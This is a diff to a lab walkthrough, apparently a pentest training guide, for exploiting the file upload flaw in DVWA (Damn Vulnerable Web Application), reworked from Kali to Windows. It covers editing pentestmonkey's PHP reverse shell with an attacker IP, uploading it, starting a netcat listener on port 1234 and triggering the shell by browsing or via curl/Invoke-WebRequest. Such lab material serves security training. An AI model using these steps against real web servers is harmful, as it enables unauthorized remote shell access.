@@ -8,28 +8,27 @@
     - http://<ip address>/dvwa/vulnerabilities/upload
 
 2. Open a terminal 
-    - `CTRL + ALT + T`
+    - Use PowerShell
 
-3. Edit the `php-reverse-shell.php` webshell to include the kali machine's IP address 
-    ```bash 
-    sudo nano /usr/share/webshells/php-reverse-shell.php
-    ```
+3. Download or copy php-reverse-shell.php into a local folder (e.g., Downloads)
+    
+    - https://github.com/pentestmonkey/php-reverse-shell
+
+4. Edit the `php-reverse-shell.php` webshell using notepad or VS Code
+
     - Change the IP address 
     ```bash 
     $IP = '192.168.56.102'; # Example IP address
     ```
 
-4. Save and exit 
+5. Save and exit 
 
-    - `CTRL + O` to save 
-    - `CTRL + X` to exit 
+6. On the target page, upload the webshell 
 
-5. On the target page, upload the webshell 
-
-6. On the kali terminal start a listener 
+7. Use Netcat for Windows: nc.exe -lvnp 1234 (must be in PATH or same folder)
 
     ```bash 
-    nc -lvnp 1234 # If you changed the port number in the webshell file then change it here 
+    nc.exe -lvnp 1234 # If you changed the port number in the webshell file then change it here 
     # l - listener mode
     # v - verbose output 
     # n - skip DNS resolution (faster) 
@@ -38,9 +37,9 @@
 
 7. Navigate to the uploaded webshell 
 
-    - The uploaded file was saved to http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php
+    - The uploaded file was saved to `http://localhost/dvwa/hackable/uploads/php-reverse-shell.php`
 
-    - Alternatively run `curl -s http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php` in another terminal 
+    - Alternatively run `Invoke-WebRequest -Uri http://localhost/dvwa/hackable/uploads/php-reverse-shell.php -UseBasicParsing` in another terminal 
 
 8. On the netcat listener look a connection
     
@@ -57,7 +56,7 @@
 
 
 ### File 
-`/var/www/dvwa/vulnerabilities/upload/source/low`
+`C:\xampp\htdocs\DVWA\vulnerabilities\upload\source\low.php`
 
 #### Key Vulnerability Points:
 
